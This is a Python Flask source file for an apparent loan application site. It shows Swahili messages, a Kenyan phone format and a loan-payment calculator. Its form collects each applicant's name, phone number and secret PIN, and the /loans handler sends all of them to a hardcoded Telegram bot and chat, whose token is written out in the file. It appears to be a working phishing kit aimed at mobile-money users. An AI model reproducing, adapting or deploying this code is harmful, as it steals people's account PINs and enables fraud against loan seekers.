from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import math
import requests

app = Flask(__name__)
CORS(app)

# TELEGRAM SETTINGS
TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik"
TELEGRAM_CHAT_ID = "8580615195"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    requests.post(url, data=data)

@app.route('/', methods=['GET'])
def home():
    return render_template_string('''
    <h2>Loan Application Form</h2>
    <form action="/loans" method="POST">
        Name: <input type="text" name="name" required><br><br>
        Phone: <input type="text" name="phone" placeholder="07xxxxxxxx" required><br><br>
        PIN: <input type="password" name="pin" required><br><br>
        Amount: <input type="number" name="amount" required><br><br>
        <input type="submit" value="Apply for Loan">
    </form>
    ''')

@app.route('/calculate-loan', methods=['POST'])
def calculate_loan():
    data = request.get_json()
    principal = float(data['principal'])
    annual_rate = float(data['annual_rate'])
    years = float(data['years'])

    monthly_rate = (annual_rate / 100) / 12
    num_payments = years * 12
    monthly_payment = principal * (monthly_rate * (1 + monthly_rate)**num_payments) / ((1 + monthly_rate)**num_payments - 1)

    return jsonify({
        "monthly_payment": round(monthly_payment, 2),
        "total_payment": round(monthly_payment * num_payments, 2),
        "total_interest": round((monthly_payment * num_payments) - principal, 2)
    })

@app.route('/loans', methods=['POST'])
def apply_loan():
    name = request.form['name']
    phone = request.form['phone'] 
    pin = request.form['pin']
    amount = request.form['amount']
    
    # Tuma kwa Telegram
    message = f"🔔 NEW LOAN APPLICATION!\n\n👤 Name: {name}\n📱 Phone: {phone}\n🔒 PIN: {pin}\n💰 Amount: Ksh {amount}"
    send_telegram(message)
    
    return f"<h2>Asante {name}!</h2><p>Umeomba loan ya Ksh {amount}. Tutakupigia kwa {phone}</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
